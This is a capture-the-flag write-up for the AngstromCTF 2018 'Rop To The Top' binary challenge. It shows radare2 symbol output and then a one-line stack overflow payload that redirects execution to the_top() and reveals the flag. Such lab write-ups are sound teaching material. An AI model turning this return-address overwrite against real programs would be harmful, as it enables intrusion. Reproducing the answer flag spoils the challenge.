# AngstromCTF_2018: Rop To The Top

**Category:** Binary
**Points:** 130
**Description:**

>Rop, rop, rop
Rop to the top!
Slip and slide and ride that rhythm... 
Here's some [binary](rop_to_the_top32) and [source](rop_to_the_top.c). Navigate to` /problems/roptothetop/` on the shell server to try your exploit out!

## Write-up
Relatively simple challenge too, with a simple ROP exploit code.

    # r2 rop_to_the_top32
    r_config_set: variable 'asm.cmtright' not found
     -- To debug a program, you can call r2 with 'dbg://<path-to-program>' or '-d <path..>'
    [0x080483e0]> aaaa
    [x] Analyze all flags starting with sym. and entry0 (aa)
    [x] Analyze len bytes of instructions for references (aar)
    [x] Analyze function calls (aac)
    [x] Emulate code to find computed references (aae)
    [x] Analyze consecutive function (aat)
    [x] Constructing a function name for fcn.* and sym.func.* functions (aan)
    [x] Type matching analysis for all functions (afta)

    [0x080483e0]> is
    [Symbols]
    [...]
    060 0x00001028 0x0804a028 GLOBAL OBJECT    0 __dso_handle
    061 0x0000061c 0x0804861c GLOBAL OBJECT    4 _IO_stdin_used
    063 0x000005a0 0x080485a0 GLOBAL   FUNC   93 __libc_csu_init
    064 0x0804a030 0x0804a030 GLOBAL NOTYPE    0 _end
    065 0x000003e0 0x080483e0 GLOBAL   FUNC    0 _start
    066 0x000004db 0x080484db GLOBAL   FUNC   25 the_top
    067 0x00000618 0x08048618 GLOBAL OBJECT    4 _fp_hw
    [...]

With the address of `the_top()`, we can now craft our exploit.

    $ ./rop_to_the_top32 `python -c "print('A' * 44 + '\xdb\x84\x04\x08')"`
    Now copying input...
    Done!
    actf{strut_your_stuff}

Therefore, the flag is `actf{strut_your_stuff}`.
